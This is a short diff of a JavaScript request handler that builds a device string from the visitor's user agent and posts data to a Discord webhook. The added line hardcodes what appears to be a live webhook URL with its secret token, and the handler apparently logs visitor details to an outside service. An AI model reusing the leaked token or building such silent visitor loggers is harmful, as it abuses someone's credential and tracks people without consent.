@@ -8,7 +8,7 @@ module.exports = async (req, res) => {
     const device = `${agent.family} on ${agent.os.family}`;
 
     // Your Discord webhook URL
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"; // Replace with your Discord webhook URL
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1313666271606210573/Q_ixOwEddkrP0_y9Q3X7jAumis9Tnf0hyxzKT--I7IKzebIx2e96gTgUgGqYXA29SzWD"; // Replace with your Discord webhook URL
 
     // Send data to Discord webhook
     request.post(DISCORD_WEBHOOK_URL, {
